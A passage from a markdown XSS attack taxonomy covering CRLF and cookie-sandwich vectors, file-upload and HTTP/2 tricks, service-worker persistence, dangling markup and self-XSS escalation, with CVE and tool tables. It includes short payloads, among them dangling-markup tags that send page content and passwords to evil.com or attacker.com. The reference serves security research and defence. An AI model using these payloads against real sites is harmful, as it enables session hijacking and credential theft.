| **ERB unescaped output** | `<%== user_input %>` or `<%= raw(user_input) %>` in Rails 3+ | `<%= %>` auto-escapes by default in Rails 3+; `<%== %>` or `raw()` bypasses escaping. In Rails 2, `<%= %>` is unsafe without the `h()` helper |
| **PHP echo injection** | `<?php echo $_GET['x']; ?>` without `htmlspecialchars()` | Direct output of user input |
| **Handlebars triple-stash** | `{{{ userInput }}}` renders unescaped HTML | Triple-mustache bypasses auto-escaping |

---

## §10. Protocol and Transport-Level Context

XSS achieved through manipulation of HTTP protocol features, cookie handling, or content negotiation.

### §10-1. HTTP Response Splitting / CRLF Injection

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Header injection to body** | `\r\n\r\n<script>alert(1)</script>` injected into HTTP header terminates headers, starts body | User input reflected in HTTP response header without CRLF filtering |
| **Content-Type override** | CRLF injection adds `Content-Type: text/html` header | Response originally non-HTML; CRLF injection possible |
| **Set-Cookie injection** | Injecting `Set-Cookie` header to plant malicious cookie values | Cookie value later rendered in DOM |

### §10-2. Cookie-Based XSS Vectors

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Cookie sandwich attack** | Manipulating `$Version` cookie to switch server to RFC2109 parsing, sandwiching HttpOnly cookie values between attacker cookies | Apache Tomcat (8.5.x, 9.0.x, 10.0.x); Chrome allows `$`-prefixed cookie names from JS |
| **Phantom $Version cookie** | Setting `$Version=1` from JavaScript forces legacy cookie parsing on server | Server supports RFC2109 fallback; Chrome browser |
| **Cookie value to DOM** | Cookie value containing XSS payload rendered via client-side JS | Application reads and renders cookies in DOM |
| **__Host/__Secure prefix bypass** | Bypassing cookie prefix protections to set cookies that override authenticated sessions | Recent research demonstrates prefix bypass techniques |

### §10-3. File Upload and Content Delivery XSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **SVG file upload** | Uploaded SVG contains `<script>` or event handlers; served with `image/svg+xml` | Application allows SVG upload; serves from same origin |
| **HTML file upload** | `.html` file uploaded and accessible directly | No content-type restriction; same-origin serving |
| **PDF XSS** | PDF internal structures provide multiple JavaScript execution triggers: `OpenAction` (auto-execute on document open), annotation `URI`/`JavaScript` actions (execute on click), `AcroForm` field validation scripts, and `SubmitForm` actions for data exfiltration. Chrome's built-in PDF viewer and Adobe Reader implement different JS API subsets, creating parser-differential bypass opportunities where payloads blocked by one renderer execute in another | `Content-Disposition: inline`; browser PDF JS enabled; server-side PDF content inspection absent or checking only a subset of action types |
| **PDF client-side data exfiltration** | PDF opened in browser inherits the origin of the hosting domain, enabling same-origin data access. PDF JavaScript API provides exfiltration via `this.submitForm()` — sending stolen data as form submission to an external URL. Text extraction APIs (`getPageNthWord()`, `getPageNumWords()`) enumerate page content programmatically. FormCalc in PDF forms (supported by Adobe Reader/Acrobat; InsertScript, 2018) can read arbitrary same-origin URLs via `Get()` and exfiltrate content via `Post()` — enabling cross-page data theft without JavaScript. Distinct from server-side PDF generation vulnerabilities (SSRF, file read): this is client-side PDF rendering exploitation where a user-uploaded or attacker-crafted PDF exfiltrates data from the hosting web application's origin | PDF served inline from application's origin; browser PDF viewer supports JS API or FormCalc; same-origin policy grants PDF access to application resources (Gareth Heyes, 2020; InsertScript, 2018 for FormCalc) |
| **XML file with XSS** | Uploaded XML processed with XSLT containing script | XML processing with user-controlled stylesheets |
| **Polyglot file** | File valid as both JPEG and HTML (or GIF and HTML) | MIME sniffing enabled; file served without `nosniff` |
| **Polyglot JPEG as CSP-allowed script** | JavaScript payload embedded in the JPEG comment section (marker `0xFF 0xFE`) creates a file that is both valid JPEG and valid JavaScript — JPEG header bytes (`0xFF 0xD8 0xFF 0xE0`) form syntactically valid (but meaningless) JS expressions. When CSP specifies `script-src 'self'`, an attacker who can upload images references the uploaded JPEG as a script source: `<script charset="ISO-8859-1" src="/uploads/polyglot.jpg"></script>`. The `charset="ISO-8859-1"` attribute is required to prevent encoding-related parse errors. Bypasses CSP because the file is served from same origin and passes the `'self'` check. Browser support: Safari, Edge, IE11; **not Chrome**. Firefox supported until v51 (patched) | `script-src 'self'` CSP; attacker can upload files to same origin; uploaded file accessible by direct URL; non-Chrome browser or Firefox < 51; `charset="ISO-8859-1"` on script tag (Gareth Heyes, 2016) |
| **Polymorphic image XSS** | Image file (JPEG, GIF, BMP) embeds XSS payload within pixel data, comment fields, or structural segments that survive server-side image re-processing (resize, transcode, metadata strip), remaining executable when the output image is rendered inline or via MIME sniffing | Same-origin serving; image processing preserves payload-bearing segments; `X-Content-Type-Options: nosniff` absent |

### §10-4. HTTP/2 Protocol-Level XSS

HTTP/2's binary framing and HPACK header compression introduce XSS vectors that do not exist in HTTP/1.1. Payloads injected through H2-specific features can survive protocol downgrade translation, bypassing WAFs that inspect only HTTP/1 traffic.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **H2 header value injection via downgrade** | HTTP/2 allows header values containing characters forbidden in HTTP/1.1 (newlines, carriage returns, null bytes). When a front-end proxy downgrades H2 to H1, these characters can break header boundaries, injecting response headers or body content containing XSS payloads | H2 front-end → H1 backend with header value passthrough; insufficient sanitization during protocol downgrade |
| **Pseudo-header reflection** | HTTP/2 pseudo-headers (`:path`, `:authority`, `:scheme`) carry values that become part of HTTP/1 request lines during downgrade. Injecting XSS payloads into pseudo-header values places them in contexts where they may be reflected in error pages, debug output, or logs | H2 → H1 downgrade; backend reflects request path or host in response without encoding |
| **HPACK dynamic table poisoning** | HPACK compression allows previously sent header values to be referenced by index. An attacker can populate the dynamic table with malicious values that are later expanded in unexpected contexts, inserting XSS payloads into headers that the application reflects | Shared HPACK state between multiplexed H2 connections; application reflects header values in response body |

---

## §11. Persistence and Advanced Exploitation Context

Techniques for maintaining XSS access beyond a single page load and maximizing exploitation impact.

### §11-1. Service Worker Persistence

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Malicious SW registration** | XSS registers a service worker that intercepts all requests and injects payloads | Application serves a JS file from same scope; HTTPS |
| **SW cache poisoning** | Service worker overwrites cached JS/HTML responses with malicious versions | Existing service worker uses Cache API; XSS can modify cache |
| **SW as C2 channel** | Service worker maintains persistent communication with attacker server | SW push notifications or periodic sync as command channel |
| **SW via DOM clobbering** | DOM clobbering overwrites the service worker registration URL | Service worker path loaded from a clobberable DOM property |

Service workers persist across sessions until replaced or manually cleared, making them one of the strongest XSS persistence mechanisms.

### §11-2. Blind XSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Admin panel injection** | Payload stored in user input field, triggers when admin views data | Admin panel renders user data without sanitization |
| **Log/monitoring injection** | XSS payload in User-Agent, Referer, or other headers logged and rendered in dashboard | Log viewer renders HTML from logged data |
| **Email/notification injection** | Payload triggers when notification is rendered in webmail or notification center | HTML rendering in notification/email context |
| **Support ticket injection** | Payload stored in ticket description, fires in agent's browser | Support platform renders HTML tickets |

Blind XSS payloads typically use `import()` or external script loading with out-of-band reporting via tools like XSS Hunter.

### §11-3. Scriptless Exploitation (Dangling Markup)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Unclosed img tag** | `<img src='https://evil.com/?` captures subsequent HTML as part of URL until next `'` | CSP blocks scripts but allows images; injection before sensitive data |
| **Unclosed form action** | `<form action='https://evil.com/?` captures form data including CSRF tokens | Form data between injection and next quote exfiltrated |
| **Unclosed textarea** | `<textarea>` captures page content until closing tag | Exfiltrates visible page content |
| **Base tag redirect** | `<base href='https://evil.com/'>` causes all relative URLs to resolve to attacker domain | No `base-uri` CSP; relative asset/form paths on page |
| **Form hijacking via `form-action` CSP gap** | `form-action` directive is not covered by `default-src` in CSP: attacker injects `<form action="https://attacker.com">` or adds `formaction` attribute to existing form buttons. Password managers auto-fill credentials into attacker-controlled form fields. Form submission is not script execution, so even strict CSP blocking inline scripts and `eval` is bypassed. Real-world case: password theft on Infosec Mastodon instance | CSP lacks explicit `form-action 'none'` or `form-action 'self'` directive; injection point within or before a form; password manager auto-fill enabled (Gareth Heyes, 2024) |
| **Dangling iframe with lazy loading** | `<iframe loading="lazy" src="https://attacker.com/?` defers loading via the `loading="lazy"` attribute, enabling dangling markup capture across tag boundaries — the unclosed `src` attribute consumes subsequent HTML until the next matching quote. Distinct from the 2018 DOM-based dangling markup technique: lazy loading delays the iframe request until the element approaches the viewport, allowing the browser to accumulate more page content into the dangling URL before the request fires | CSP does not restrict iframe `src` to same origin; injection point before sensitive content; browser supports lazy loading (Gareth Heyes, 2022) |

### §11-4. Self-XSS Escalation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Credentialless iframe + login CSRF** | Self-XSS escalation: the attacker embeds the target in a `credentialless` iframe (which loads the page in a separate ephemeral context without the victim's cookies or storage), then performs a login CSRF to authenticate the iframe as the attacker's account (where the self-XSS payload is stored). The payload executes in the victim's browser but within the iframe's ephemeral origin context — it does **not** directly access the victim's cookies or same-origin storage. Escalation to the victim's authenticated context requires additional steps (e.g., window reference manipulation, navigation, or postMessage relay to the parent frame) | Self-XSS vulnerability; login endpoint lacks CSRF protection; target permits framing (no `X-Frame-Options` or permissive `frame-ancestors`); browser supports `credentialless` iframe attribute |
| **Window reference escalation** | After self-XSS fires in a credentialless iframe authenticated as the attacker, the injected script obtains references to the parent page's authenticated context via `window.open()` or top-level navigation, escalating from attacker-session XSS to victim-session compromise | Self-XSS in credentialless frame + ability to navigate or open windows in the target origin |
| **SSO gadget chain (OAuth/OIDC flow)** | OAuth/OIDC authorization flows create cross-origin navigation chains (RP → IdP → RP) that carry attacker-influenceable state through URL parameters (`state`, `redirect_uri`, `login_hint`). The attacker crafts an authorization URL that routes the victim through IdP authentication and back to a RP page where stored self-XSS payload executes — in the victim's post-authentication context. Unlike credentialless iframe escalation, this uses the victim's own authentication rather than forcing the attacker's session | Self-XSS on a page reachable from the OAuth callback flow; OAuth flow preserves navigation to the vulnerable page (see `oauth.md` §10-4) |
| **Token endpoint callback injection** | In implicit or hybrid OAuth flows, the authorization response parameters (code, token, error, state) are processed by client-side JavaScript on the callback page. If this processing has an injection flaw, the attacker crafts a forged authorization response URL with malicious values that trigger XSS when the callback handler evaluates them — escalating a parameter injection to full XSS in the authenticated context | Client-side OAuth callback processing with insufficient sanitization; implicit or hybrid flow (see `oauth.md` §10-4) |
| **javascript: pseudo-protocol in SSO redirect** | OAuth 2.0 and SAML flows use HTTP redirects (302) and auto-submitting HTML forms (POST binding) to transport tokens between parties. When an AS or SP generates an auto-submit form with a user-controllable `action` URL (e.g., from `redirect_uri` or `RelayState`), an attacker injects `javascript:` as the form action. The browser executes the pseudo-protocol URI in the context of the page hosting the auto-submit form — which is the IdP or SP origin — achieving XSS in a highly privileged authentication context. PKCE and `state` parameters do not prevent this because the injection occurs in the transport mechanism, not the authorization grant | Auto-submit form action derived from attacker-controllable parameter (`redirect_uri`, `RelayState`); insufficient scheme validation (no allowlist restricting to `https://`); POST binding in SAML or `form_post` response mode in OAuth (Lauritz Holtmann, 2024) |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **Session Hijacking** | Any web app with session cookies | §1 + §3 + §10-2 — Execute JS to exfiltrate `document.cookie` or use cookie sandwich |
| **Account Takeover** | Apps with API tokens or OAuth | §3-3 + §6-3 + §4-3 — DOM XSS chains with postMessage leaks and redirect exploitation |
| **Credential Phishing** | Any authenticated application | §1-2 + §11-2 — Inject fake login form via stored/blind XSS |
| **Data Exfiltration (scripted)** | Apps with sensitive client-side data | §3-2 + §6-3 — Read DOM content, API responses, or cross-origin data |
| **Data Exfiltration (scriptless)** | CSP-protected applications | [`css-injection.md`](css-injection.md) §1 + §11-3 — CSS selectors and dangling markup leak data without JS |
| **Persistent Compromise** | HTTPS applications | §11-1 — Service worker registration for long-term payload injection |
| **Worm Propagation** | Social platforms, messaging apps | §1 + §3-2 — Self-propagating stored XSS that replicates via social features |
| **Cache Poisoning** | CDN/proxy-fronted applications | §7-3 + §8-3 — Inject XSS into cached responses via MIME confusion or parameter pollution |
| **WAF/ACL Bypass** | Enterprise applications behind WAFs | §8 — Bypass WAF to reach underlying XSS, chain with §1–§4 for execution |
| **Keylogging / Surveillance** | Any targeted application | §1-2 + §11-1 — Event listeners capture keystrokes; service worker persists access |
| **Cryptomining** | High-traffic web applications | §1-1 + §11-1 — Inject mining script; persist via service worker |

---

## CVE / Bounty Mapping (Notable Cases)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §7-1 (Node flattening mXSS) | CVE-2024-47875 (DOMPurify < 2.5.0 and >= 3.0.0, < 3.1.3) | DOMPurify sanitization bypass; arbitrary JS execution in all dependent apps |
| §7-1 (Regex sanitizer bypass) | CVE-2025-26791 (DOMPurify < 3.2.4) | mXSS via incorrect template literal regex in `SAFE_FOR_TEMPLATES` mode |
| §6-2 (Prototype pollution → sanitizer depth check) | CVE-2024-45801 (DOMPurify < 2.5.4 and >= 3.0.0, < 3.1.3) | Prototype pollution weakens nesting depth check, enabling nesting-based mXSS |
| §6-1 (DOM clobbering → script load) | CVE-2024-43788 (Webpack) | DOM clobbering in `AutoPublicPathRuntimeModule` leads to XSS |
| §6-1 (DOM clobbering → router) | CVE-2024-47885 (Astro) | DOM clobbering in client-side router enables stored XSS |
| §6-1 (DOM clobbering → bundler) | CVE-2024-47068 (Rollup) | `import.meta.url` clobbering in bundled scripts; npm supply chain impact |
| §9-2 (Markdown link injection) | CVE-2025-24981 (Nuxt MDC) | XSS via HTML-entity-encoded `javascript:` in markdown link URLs |
| §9-2 (Markdown to JSX) | CVE-2024-21535 (markdown-to-jsx) | XSS via malicious iframe in markdown `src` property |
| §2-3 (Stored XSS in PAN-OS) | CVE-2024-5920 (Palo Alto PAN-OS) | Admin impersonation via stored XSS pushed from Panorama |
| §10-1 (CRLF to XSS) | CVE-2024-52875 (GFI KerioControl) | CRLF injection in `dest` parameter; 1-click RCE chain |
| §6-1/§6-3 (XSS in Copilot Studio) | CVE-2024-49038 (Microsoft Copilot Studio) | Microsoft CNA CVSS 9.3; NVD 9.6; CWE-79. The NVD record describes XSS/elevation of privilege, while Microsoft's later analysis documents `postMessage`, an overbroad `validDomains` wildcard, and `isFullTrust` as delivery and trust conditions |
| §9-1 (Vue template XSS) | CVE-2024-6783 (vue-template-compiler) | Prototype pollution enables XSS in Vue 2.x template compiler |
| §6-3 (postMessage chain) | ZoomInfo Chat (July 2024) | Two-stage: token leakage via `postMessage('*')` + DOM XSS |
| §6-3 (postMessage ATO) | Meta Conversion API Gateway (Jan 2026, personal blog report) | Account takeover via unvalidated postMessage origin. Source: individual researcher blog post — details not independently confirmed by Meta advisory |
| §10-2 (Cookie sandwich) | Apache Tomcat (2025 research) | HttpOnly cookie theft via RFC2109 parsing switch; phantom `$Version` cookie |
| §8-3 (Parameter pollution) | WAF bypass research (2024) | 14 of 17 major WAF configurations bypassed (AWS, GCP, Azure, Cloudflare) |
| §9-1 (Expression sandbox escape) | CVE-2025-59840 (Vega) | Expression sandbox bypass via implicit toString gadget chain; arbitrary JS execution |
| §10-3 (QR code injection context) | CVE-2019-17003 (Firefox for iOS QR reader) | XSS via malicious QR code scanned by Firefox for iOS's QR scanner; script execution in the app's web view context |
| §10-3 (Embedded application sandbox escape) | CVE-2024-32472 (Excalidraw) | Web embeddable component: iframe `srcdoc` HTML injection + attribute injection + `allow-same-origin` sandbox combination enables arbitrary JavaScript execution in the embedding application's origin |
| §7-1 (Element rename/unrename bypass) | Skiff/Proton Mail XSS (SonarSource, 2023) | Email client sanitizer bypass; arbitrary JavaScript execution in victim's mailbox via crafted email |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **XSStrike** (Scanner) | Reflected, DOM, Blind XSS | Intelligent fuzzing with browser-engine verification; multi-parser payload generation |
| **Burp Suite Scanner** (Commercial) | All XSS types | Crawl-and-audit with DOM analysis; passive/active scanning |
| **DOM Invader** (Burp Extension) | DOM XSS, Prototype Pollution | Automated DOM source-to-sink analysis; prototype pollution gadget scanner |
| **XSS Hunter** (Blind XSS) | Blind/Stored XSS | Out-of-band payload reporting with screenshots and DOM snapshots |
| **DOMPurify** (Sanitizer) | mXSS, HTML injection | Server/client-side HTML sanitization; regularly updated mutation rules |
| **Trusted Types** (Browser API) | DOM XSS | Browser-enforced policy requiring sanitized types for DOM sinks |
| **xssFuzz** (Fuzzer) | WAF bypass, CSP misconfig | Tag/attribute fuzzing; CSP configuration analysis |
| **XSSGAI** (AI Fuzzer) | WAF bypass | ML-generated adversarial payloads; high bypass rates reported against tested WAFs |
| **Shadow Workers** (C2) | XSS post-exploitation | Service worker-based persistence and proxying framework |
| **Knoxss** (AI Scanner) | All XSS types | AI-powered automated deep scanning; minimal configuration |
| **CSP Evaluator** (Google) | CSP configuration | Static analysis of Content Security Policy for bypass-prone directives |
| **RetireJS** (Library Scanner) | Known vulnerable libraries | Detects outdated JS libraries with known XSS vulnerabilities |
| **Semgrep** (SAST) | Source code XSS patterns | Static analysis rules for `innerHTML`, `eval`, `dangerouslySetInnerHTML`, etc. |

---

## References

- [PortSwigger Research. "Cross-Site Scripting (XSS) Cheat Sheet — 2026 Edition."](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger Research. "Bypassing DOMPurify again with mutation XSS."](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- [PortSwigger Research. "Stealing HttpOnly cookies with the cookie sandwich technique."](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)
- [PortSwigger Research. "Bypassing WAFs with the phantom $Version cookie."](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [PortSwigger Research. "Cookie Chaos: How to bypass __Host and __Secure cookie prefixes."](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [PortSwigger Research. "Exploiting XSS in hidden inputs and meta tags."](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)
- [PortSwigger Research. "SVG animate XSS vector."](https://portswigger.net/research/svg-animate-xss-vector)
- [PortSwigger Research. "Hijacking service workers via DOM Clobbering."](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
- [PortSwigger Research. "Evading CSP with DOM-based dangling markup."](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- [PortSwigger Research (Gareth Heyes). "Bypassing CSP using polyglot JPEGs" (2016).](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)
- [PortSwigger Research (Gareth Heyes). "Portable Data exFiltration: XSS for PDFs" (2020).](https://portswigger.net/research/portable-data-exfiltration)
- [PortSwigger Research (Gareth Heyes). "Bypassing CSP with dangling iframes" (2022).](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)
- [PortSwigger Research (Gareth Heyes). "Using form hijacking to bypass CSP" (2024).](https://portswigger.net/research/using-form-hijacking-to-bypass-csp)
- [PortSwigger Research. "New exotic events in the XSS cheat sheet."](https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet)
- [Mizu.re. "Exploring the DOMPurify library: Bypasses and Fixes."](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)
- [Securitum Research. "Mutation XSS via namespace confusion — DOMPurify < 2.0.17 bypass."](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
- [BeaconRed Research. "When Purification Fails: Exploiting DOMPurify's Leftovers."](https://shaheen.beaconred.net/research/2025/05/28/when-purification-fails.html)
- [CVE News. "CVE-2024-47875 — Breaking Down the DOMPurify mXSS Vulnerability."](https://www.cve.news/cve-2024-47875/)
- [CVE News. "CVE-2025-26791 — Exploiting DOMPurify's Regular Expression Bug for mXSS."](https://www.cve.news/cve-2025-26791/)
- [GitHub Advisory. "Webpack AutoPublicPathRuntimeModule DOM Clobbering XSS (GHSA-4vvj-4cpr-p986)."](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)
- [GitHub Advisory. "Astro client-side router DOM Clobbering XSS (CVE-2024-47885)."](https://advisories.gitlab.com/pkg/npm/astro/CVE-2024-47885/)
- [Buer.haus. "Go Go XSS Gadgets: Chaining a DOM Clobbering Exploit in the Wild."](https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/)
- [USENIX Security 2025. "The DOMino Effect: Detecting and Exploiting DOM Clobbering Gadgets."](https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-858-liu-zhengyu.pdf)
- [Ethiack Blog. "Bypassing WAFs for Fun and JS Injection with Parameter Pollution."](https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution)
- [TrustedSec. "Persistence Through Service Workers."](https://trustedsec.com/blog/persistence-through-service-workers-part-1-introduction-and-target-application-setup)
- [Shadow Workers Project.](https://shadow-workers.github.io/)
- [Akamai Blog. "Abusing the Service Workers API."](https://www.akamai.com/blog/security/abusing-the-service-workers-api)
- [Microsoft MSRC. "Weaponizing cross site scripting: When one bug isn't enough."](https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough)
- [Microsoft MSRC. "PostMessaged and Compromised."](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)
- [Youssef Sammouda. "Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover."](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Bugcrowd Blog. "The guide to blind XSS."](https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/)
- [Intigriti Blog. "CSP Bypasses: Advanced Exploitation Guide."](https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses)
- [Jorian Woltjer. "Nonce CSP bypass using Disk Cache."](https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache)
- [Node.js Security. "How I found an XSS in the Nuxt MDC Library for Markdown Content."](https://www.nodejs-security.com/blog/nuxt-mdc-xss-vulnerability)
- [W3C Blog. "How to protect your Web applications from XSS (2025)."](https://www.w3.org/blog/2025/how-to-protect-your-web-applications-from-xss/)
- [The Hacker News. "Why React Didn't Kill XSS: The New JavaScript Injection Playbook."](https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html)
- [BroadChannel. "XSSGAI and AI-Generated XSS: Why Traditional WAF Rules Are Obsolete in 2025."](https://broadchannel.org/xssgai-ai-generated-xss-waf-bypass/)
- [OWASP. "XSS Filter Evasion Cheat Sheet."](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [OWASP. "DOM Clobbering Prevention Cheat Sheet."](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [HackTricks. "Cross Site Scripting (XSS)."](https://book.hacktricks.wiki/pentesting-web/xss-cross-site-scripting)
- tttang. "A Magic Way of XSS in HTTP/2" (2022) — XSS vectors exploiting HTTP/2 binary framing and header compression characteristics
